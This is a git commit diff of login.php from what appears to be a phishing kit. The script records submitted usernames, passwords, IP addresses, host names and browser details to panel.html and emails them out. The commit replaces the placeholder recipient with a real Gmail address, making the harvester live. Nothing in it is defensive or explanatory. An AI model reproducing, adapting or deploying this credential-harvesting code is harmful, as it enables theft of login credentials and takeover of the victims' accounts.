b3c3763425acf518c82525320bfc524e926fdb9f
kslahxksk <77684823+kslahxksk@users.noreply.github.com>
2021-01-31 20:37:22 +0300

    Update login.php

--- login.php
+++ login.php
@@ -3,13 +3,13 @@ file_put_contents("panel.html", "<br><br><b>-------NEW USER DETECTED------</b>  
 
 //Mail Function
 
-$to = "youremail@here.com";
+$to = "baba8baba80@gmail.com";
 $subject = "New User Detected";
 $message = '<b>User:</b> '  . $_POST['username'].'<br>' .'<b>Pass:</b> ' . $_POST['password'].'<br>' .'<b>IP:</b> ' . $_SERVER['REMOTE_ADDR'].'<br>' .'<b>HOST:</b> ' . gethostbyaddr($_SERVER['REMOTE_ADDR']).'<br>' .'<b>BROWSER:</b> ' . $_SERVER['HTTP_USER_AGENT'];
 $title  = 'MIME-Version: 1.0' . "\r\n";
 $title .= 'Content-type: text/html; charset=utf-8' . "\r\n";
-$title .= 'To: NAME youremail@here.com>' . "\r\n";
-$title .= 'From: NAME <youremail@here.com>' . "\r\n";
+$title .= 'To: NAME baba8baba80@gmail.com>' . "\r\n";
+$title .= 'From: NAME <baba8baba80@gmail.com>' . "\r\n";
 mail($to,$subject,$message,$title);
 
 
